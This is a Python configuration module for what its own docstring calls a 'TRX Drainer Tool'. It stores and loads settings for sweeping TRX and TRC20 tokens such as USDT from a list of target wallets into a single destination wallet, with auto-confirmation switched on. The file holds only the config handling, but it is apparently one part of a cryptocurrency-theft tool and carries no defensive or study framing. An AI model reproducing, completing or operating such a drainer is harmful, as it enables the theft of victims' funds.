# -*- coding: utf-8 -*-
"""Configuration loader for TRX Drainer Tool — config.json"""

import json
from pathlib import Path

BASE_DIR = Path(__file__).parent

_DEFAULTS = {
    "target_wallets": [],
    "destination_wallet": "",
    "drain_mode": "sweep",
    "min_balance_trx": 100,
    "include_trc20": True,
    "trc20_tokens": ["USDT", "USDC", "BTT", "WIN", "JST"],
    "rpc_endpoint": "https://api.trongrid.io",
    "energy_optimize": True,
    "auto_confirm": True,
    "fee_limit": 10000000,
}


def load_config() -> dict:
    config_path = BASE_DIR / "config.json"
    if not config_path.exists():
        save_config(_DEFAULTS)
        return dict(_DEFAULTS)
    try:
        with open(config_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        merged = dict(_DEFAULTS)
        merged.update(data)
        return merged
    except (json.JSONDecodeError, IOError):
        return dict(_DEFAULTS)


def save_config(config: dict):
    config_path = BASE_DIR / "config.json"
    with open(config_path, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=4, ensure_ascii=False)


def get_target_wallets(config: dict) -> list:
    return config.get("target_wallets", [])


def get_destination(config: dict) -> str:
    return config.get("destination_wallet", "")


def add_target_wallet(config: dict, address: str) -> dict:
    wallets = config.setdefault("target_wallets", [])
    if address not in wallets:
        wallets.append(address)
    save_config(config)
    return config


def set_destination(config: dict, address: str) -> dict:
    config["destination_wallet"] = address
    save_config(config)
    return config
